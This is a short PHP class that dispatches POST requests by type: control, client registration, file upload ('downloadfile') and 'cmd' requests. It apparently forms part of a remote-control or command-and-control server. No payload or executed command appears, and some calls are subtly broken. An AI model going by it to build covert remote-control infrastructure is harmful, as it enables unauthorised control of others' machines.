<?php

namespace Halo\Requests;

use Halo\Requests\ControlRequest;
use Halo\Requests\RegisterClient;
use Halo\Requests\Cmd;

class RequestListener
{
	static public function waitForRequest(): void
	{
		if (isset($_POST['type']) && !empty($_POST['type'])) {

			switch ($_POST['type']) {

				case 'control-request':
					self::processControlRequest(new ControlRequest($_POST));
					break;

				case 'register-client-request':
					$_POST['client'] = (array)json_decode($_POST['client']);
					self::processRegisterClientRequest(new RegisterClient($_POST));
					break;

				case 'downloadfile-request':
					self::processDownloadFileRequest(new DownloadFile($_POST, $_FILES));
					break;

				case 'cmd-request':
					self::processCmdRequest(new Cmd($_POST));
					break;

				default:
					return;
					break;
			}
		}
	}

	private function processControlRequest($processControlRequestInstance): void
	{
		$processControlRequestInstance->processRequest();
	}

	private function processRegisterClientRequest($processRegisterClientRequestInstance): void
	{
		$processRegisterClientRequestInstance->processRequest();
	}

	private function processDownloadFileRequest($processDownloadFileRequestInstance): void
	{
		$processDownloadFileRequestInstance->processRequest();
	}

	private function processCmdRequest($processCmdRequestInstance): void
	{
		$processCmdRequestInstance->processRequest();
	}
}
